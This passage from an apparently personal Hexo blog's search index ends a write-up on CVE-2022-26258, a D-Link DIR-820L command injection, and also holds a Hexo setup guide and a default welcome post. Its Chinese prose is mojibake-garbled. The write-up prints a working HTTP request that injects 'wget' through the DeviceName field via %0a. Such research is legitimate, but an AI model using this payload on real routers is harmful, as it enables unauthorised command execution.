alt="image-20220425141433485"></p><p>Ê≠£Â¶Ç‰πãÂâçÂàÜÊûêÁöÑÈÇ£Ê†∑ÔºåÊâÄÊúâÁöÑÂèÇÊï∞ÈÉΩÊãºÊé•Ëµ∑Êù•‰∫Ü„ÄÇÁÑ∂ÂêéÂ∞ùËØïÂØπÊ≠§Â§Ñ‰ΩøÁî®Êç¢Ë°åÁ¨¶ÁªïËøáÔºå‰πüÂ∞±ÊòØ‚Äù%0a‚Äù„ÄÇËøôÈáåÊúâ‰∏Ä‰∏™ÊØîËæÉÁÆÄÂçïÁöÑÈ™åËØÅÊñπÊ≥ïÔºåÂ∞±ÊòØÁî®python Ëµ∑‰∏Ä‰∏™ÁÆÄÂçïÁöÑHTTPÊúçÂä°ÔºåÁÑ∂Âêé‰ΩøÁî®wget ÂëΩ‰ª§ËØ∑Ê±ÇËøô‰∏™HTTPÊúçÂä°ÔºåÂ¶ÇÊûúÊàêÂäüËØ∑Ê±ÇÔºåÂú®ÁªàÁ´Ø‰∏≠Â∞±‰ºöËæìÂá∫ËØ∑Ê±ÇÁöÑÁõ∏ÂÖ≥‰ø°ÊÅØÔºåÂπ∂‰∏îwget‰ºö‰∏ÄÁõ¥ÂèëÂá∫ËØ∑Ê±ÇÔºåÁî®‰∫éÊµãËØïÂú®ÂêàÈÄÇ‰∏çËøá‰∫ÜÔºö</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> python -m SimpleHTTPServer <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ÊúÄÂêé‰øÆÊîπDevice NameËøôÊù°ÂèÇÊï∞ÔºåÊúÄÂêéËØ∑Ê±ÇÂ§¥Â¶Ç‰∏ãÔºö</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;get_set.ccp HTTP&#x2F;1.1Host: 192.168.0.1Content-Length: 765Accept: application&#x2F;xml, text&#x2F;xml, *&#x2F;*; q&#x3D;0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;100.0.4896.127 Safari&#x2F;537.36Content-Type: application&#x2F;x-www-form-urlencodedOrigin: &lt;http:&#x2F;&#x2F;192.168.0.1&gt;Referer: &lt;http:&#x2F;&#x2F;192.168.0.1&#x2F;lan.asp&gt;Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q&#x3D;0.9Cookie: hasLogin&#x3D;¬ß1¬ßConnection: closeccp_act&#x3D;¬ßset¬ß&amp;old_ip&#x3D;¬ß192.168.0.1¬ß&amp;old_mask&#x3D;¬ß255.255.255.0¬ß&amp;new_ip&#x3D;¬ß192.168.0.1¬ß&amp;new_mask&#x3D;¬ß255.255.255.0¬ß&amp;nextPage&#x3D;¬ßlan.asp¬ß&amp;lanHostCfg_IPAddress_1.1.1.0&#x3D;¬ß192.168.0.1¬ß&amp;lanHostCfg_SubnetMask_1.1.1.0&#x3D;¬ß255.255.255.0¬ß&amp;lanHostCfg_DomainName_1.1.1.0&#x3D;¬ß¬ß&amp;lanHostCfg_DNSRelay_1.1.1.0&#x3D;¬ß1¬ß&amp;lanHostCfg_DHCPServerEnable_1.1.1.0&#x3D;¬ß1¬ß&amp;lanHostCfg_MinAddress_1.1.1.0&#x3D;¬ß192.168.0.100¬ß&amp;lanHostCfg_MaxAddress_1.1.1.0&#x3D;¬ß192.168.0.200¬ß&amp;lanHostCfg_DHCPLeaseTime_1.1.1.0&#x3D;¬ß1440¬ß&amp;lanHostCfg_DeviceName_1.1.1.0&#x3D;¬ß%0awget &lt;http:&#x2F;&#x2F;192.168.0.2&gt;%0a¬ß&amp;lanHostCfg_AlwaysBroadcast_1.1.1.0&#x3D;¬ß0¬ß&amp;lanHostCfg_NetBIOSAnnouncement_1.1.1.0&#x3D;¬ß0¬ß&amp;lanHostCfg_NetBIOSLearn_1.1.1.0&#x3D;¬ß0¬ß&amp;lanHostCfg_NetBIOSScope_1.1.1.0&#x3D;¬ß¬ß&amp;lanHostCfg_NetBIOSNodeType_1.1.1.0&#x3D;¬ß2¬ß&amp;lanHostCfg_PrimaryWINSAddress_1.1.1.0&#x3D;¬ß0.0.0.0¬ß&amp;lanHostCfg_SecondaryWINSAddress_1.1.1.0&#x3D;¬ß0.0.0.0¬ß&amp;1650509593486&#x3D;¬ß1650509593486¬ß<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Âú®ÁªàÁ´Ø‰∏≠ÁúãÂà∞Êù•Ëá™192.168.0.1ÁöÑËØ∑Ê±ÇÔºåËØ¥ÊòéÂëΩ‰ª§Ê≥®ÂÖ•ÊàêÂäüÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425141445337.png" alt="image-20220425141445337"></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://iotsec-zone.com/article?id=123">IOTsec-Zone Áâ©ËÅîÁΩëÂÆâÂÖ®Á§æÂå∫ | D-Link CVE-2022-26258 ÂëΩ‰ª§Ê≥®ÂÖ•</a></p><p><a href="https://github.com/skyedai910/Vuln/tree/master/DIR-820L/command_execution_0">Vuln&#x2F;DIR-820L&#x2F;command_execution_0 at master ¬∑ skyedai910&#x2F;Vuln</a></p><p><a href="https://github.com/pr0v3rbs/FirmAE">https://github.com/pr0v3rbs/FirmAE</a></p><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26258">CVE - CVE-2022-26258</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HexoÊê≠Âª∫ÂçöÂÆ¢</title>
      <link href="/2022/04/24/hexo-da-jian-bo-ke/"/>
      <url>/2022/04/24/hexo-da-jian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="ÂÆâË£ÖÈÖçÁΩÆHexo"><a href="#ÂÆâË£ÖÈÖçÁΩÆHexo" class="headerlink" title="ÂÆâË£ÖÈÖçÁΩÆHexo"></a>ÂÆâË£ÖÈÖçÁΩÆHexo</h1><p>ÂÆâË£ÖnodeÁéØÂ¢É</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">brew <span class="token function">install</span> <span class="token function">node</span><span class="token function">npm</span> <span class="token function">install</span> -g hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Êú¨Âú∞Êñ∞Âª∫Êñá‰ª∂Â§πÔºåÁÑ∂ÂêéÂàùÂßãÂåñhexo</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> blog<span class="token builtin class-name">cd</span> bloghexo init blog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>blogÊñá‰ª∂Â§π‰∏∫Ê†πÊñá‰ª∂Â§πÔºåÂÖ∂‰∏≠ÈÖçÁΩÆÊñá‰ª∂ _config.yml ÊòØÈÖçÁΩÆ hexo ÁöÑÔºåÂè¶Â§ñÂú® themes Êñá‰ª∂Â§π‰∏ã‰πüÊúâ  _config.yml Êñá‰ª∂ÔºåÊòØÁî®‰∫éÈÖçÁΩÆ‰∏ªÈ¢òÁöÑ„ÄÇ</p><p>Âú®GitHubÊñ∞Âª∫‰ªìÂ∫ìÔºå‰ªìÂ∫ìÂêç‰∏∫ [githubÁî®Êà∑Âêç].github.io Ôºå‰øÆÊîπÊ†πÊñá‰ª∂Â§π‰∏ãÁöÑ _config.yml ÁöÑ deploy ÈÖçÁΩÆÔºåÂ∞Ü repo Êîπ‰∏∫ÂàöÊâçÁöÑ‰ªìÂ∫ìË∑ØÂæÑÔºåtype Êîπ‰∏∫‚Äúgit‚ÄùÔºåÂ¶Ç‰∏ãÔºö</p><pre class="line-numbers language-yml" data-language="yml"><code class="language-yml">deploy:  type: &#39;git&#39;  repo: https:&#x2F;&#x2F;github.com&#x2F;unrav31&#x2F;unrav31.github.io.git  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ÂÆâË£Öhexo-deployer-gitÔºåËøôÊ†∑ÊâçËÉΩÂ∞ÜÊú¨Âú∞Êñá‰ª∂ÈÉ®ÁΩ≤Âà∞github‰∏≠Ôºö</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ÈöèÂêéÊåâÈ°∫Â∫èËæìÂÖ•‰ª•‰∏ãÂëΩ‰ª§Ôºö</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo cleanhexo ghexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>hexo clean</code>ÔºöÊ∏ÖÈô§ÁºìÂ≠ò</p><p><code>hexo g</code>Ôºöhexo generateÔºåÁîüÊàê</p><p><code>hexo d</code>Ôºöhexo deployÔºåÈÉ®ÁΩ≤Âà∞github</p><p>ËøôÊó∂ÂÄôÂèØ‰ª•Âú®github.ioÊü•ÁúãÂà∞Êê≠Âª∫Â•ΩÁöÑÈ°πÁõÆ‰∫Ü„ÄÇ</p><h1 id="ÈÖçÁΩÆHexo‰∏ªÈ¢ò"><a href="#ÈÖçÁΩÆHexo‰∏ªÈ¢ò" class="headerlink" title="ÈÖçÁΩÆHexo‰∏ªÈ¢ò"></a>ÈÖçÁΩÆHexo‰∏ªÈ¢ò</h1><p>ÈªòËÆ§‰∏ªÈ¢ò‰∏çÊòØÂæàÂ•ΩÁúãÔºåÊàëËøôÈáåÊòØÁî®ÁöÑ <a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md">blinkfox</a> ÔºåÂèØ‰ª•Âú® <a href="https://hexo.io/themes/">themes</a> ÊâæÂà∞Ëá™Â∑±ÂñúÊ¨¢ÁöÑ‰∏ªÈ¢ò„ÄÇ</p><p>ËøõÂÖ•Âà∞ themes Êñá‰ª∂Â§π‰∏ãÔºåÁÑ∂Âêé‰∏ãËΩΩblinkfoxÔºö</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> themes<span class="token function">git</span> clone https://github.com/blinkfox/hexo-theme-matery.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>‰øÆÊîπhexoÊ†πÁõÆÂΩï‰∏ãÁöÑ <strong>_config.yml</strong> Êñá‰ª∂ÁöÑ <code>themes</code> ÂÄºÔºö</p><pre class="line-numbers language-yml" data-language="yml"><code class="language-yml">theme: hexo-theme-matery<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ÂÖ≥‰∫é _config.yml ÁöÑÂÖ∂‰ªñ‰øÆÊîπÂª∫ËÆÆÔºö</p><ul><li>‰øÆÊîπ <code>_config.yml</code> ÁöÑ <code>url</code> ÁöÑÂÄº‰∏∫‰Ω†ÁöÑÁΩëÁ´ô‰∏ª <code>URL</code>ÔºàÂ¶ÇÔºö<code>http://xxx.github.io</code>Ôºâ„ÄÇ</li><li>Âª∫ËÆÆ‰øÆÊîπ‰∏§‰∏™ <code>per_page</code> ÁöÑÂàÜÈ°µÊù°Êï∞ÂÄº‰∏∫ <code>6</code> ÁöÑÂÄçÊï∞ÔºåÂ¶ÇÔºö<code>12</code>„ÄÅ<code>18</code> Á≠âÔºåËøôÊ†∑ÊñáÁ´†ÂàóË°®Âú®ÂêÑ‰∏™Â±èÂπï‰∏ãÈÉΩËÉΩËæÉÂ•ΩÁöÑÊòæÁ§∫„ÄÇ</li><li>Â¶ÇÊûú‰Ω†ÊòØ‰∏≠ÊñáÁî®Êà∑ÔºåÂàôÂª∫ËÆÆ‰øÆÊîπ <code>language</code> ÁöÑÂÄº‰∏∫ <code>zh-CN</code>„ÄÇ</li></ul><p>ÊúÄÂêéÂú®Ê†πÁõÆÂΩï‰ΩøÁî®‰∏Ä‰∏ãÂëΩ‰ª§Ôºö</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo cleanhexo ghexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>‰ª•‰∏äÊìç‰ΩúÂ∞±ÂÆåÊàêÊõ¥Êîπ‰∏ªÈ¢ò‰∫Ü„ÄÇ</p><p>ÂÖ∂‰ªñÊõ¥Â§öÁöÑÈÖçÁΩÆ‰øÆÊîπÊñπÊ≥ïËßÅ <a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md">ÂÆòÊñπÊâãÂÜå</a> „ÄÇ</p><p>ÊïàÊûúÂõæÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220424232123575.png?token=ATQEVQUFDYSYS5EO5RXOJILCMYC5K" alt="image-20220424232123575"></p><h1 id="ËÆæÁΩÆÂõæÂ∫ä"><a href="#ËÆæÁΩÆÂõæÂ∫ä" class="headerlink" title="ËÆæÁΩÆÂõæÂ∫ä"></a>ËÆæÁΩÆÂõæÂ∫ä</h1><p>ÂõæÁâáÂú® typora ‰∏≠ÊòØÊú¨Âú∞Êñá‰ª∂Â≠òÂÇ®ÁöÑÔºåÂú®hexoÈÉ®ÁΩ≤‰πãÂêéÊó†Ê≥ïÊü•ÁúãÂõæÁâáÔºåËøôÊó∂ÈúÄË¶ÅÂú®ËøúÁ®ãÊê≠Âª∫‰∏Ä‰∏™ÂõæÂ∫ä„ÄÇ</p><p>ÂõæÂ∫äÂèØ‰ª•ÊúâÂ§öÁßçÊñπÂºèÔºåÊàëËøôÈáåÈÄâÊã© github ‰Ωú‰∏∫ÂõæÂ∫äÔºåÂõ†‰∏∫ÂÆÉÂÖçË¥π„ÄÇ</p><p>È¶ñÂÖàÂú® github Êñ∞Âª∫‰∏Ä‰∏™‰ªìÂ∫ìÔºåÈúÄË¶ÅÊòØÂÖ¨ÂºÄÁöÑ‰ªìÂ∫ìÂê¶ÂàôÊó†Ê≥ïÊü•ÁúãÂõæÁâá„ÄÇÁÑ∂Âêé‰∏ãËΩΩ <a href="https://github.com/Molunerfinn/picgo/releases">PicGo</a> ËøõË°åËÆæÁΩÆÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425135339804.png" alt="image-20220425135339804"></p><p>token Â∞±ÊòØ github ÁöÑËÆøÈóÆ tokenÔºåÂàÜÊîØÊåâÁÖßÂàõÂª∫‰ªìÂ∫ìÊó∂ÁöÑÂàÜÊîØÂ°´ÂÜôÔºå‰ªìÂ∫ìÂêçÁß∞ÊòØ [Áî®Êà∑Âêç&#x2F;‰ªìÂ∫ìÂêç] ÁöÑÂΩ¢Âºè„ÄÇ</p><p>ÊúÄÂêéÂú® typora ËÆæÁΩÆ‰∏≠ËÆæÁΩÆËá™Âä®ÁîüÊàêÂõæÂ∫äÈìæÊé•„ÄÇÁÇπÂáª„ÄåÂÅèÂ•ΩËÆæÁΩÆ„ÄçÔºåËÆæÁΩÆÂ¶Ç‰∏ãÂÜÖÂÆπÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220425135810193.png" alt="image-20220425135810193"></p><p>ÁÑ∂ÂêéÂú® typora ‰∏≠Á≤òË¥¥ÂõæÁâáÂ∞±ÂèØ‰ª•‰∏ä‰º†Âà∞ÂõæÂ∫äÂï¶ÔºåÊúÄÂêéÂÜçÊ¨°ÈÉ®ÁΩ≤hexoÔºåÊï¥‰∏™ËøáÁ®ãÂ∞±ÂÆåÊàê‰∫Ü„ÄÇ</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://zhuanlan.zhihu.com/p/26625249">GitHub+Hexo Êê≠Âª∫‰∏™‰∫∫ÁΩëÁ´ôËØ¶ÁªÜÊïôÁ®ã</a></p><p><a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md">hexo‰∏≠ÊñáÊâãÂÜå</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ÂÆâË£ÖÁéØÂ¢É </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/04/24/hello-world/"/>
      <url>/2022/04/24/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
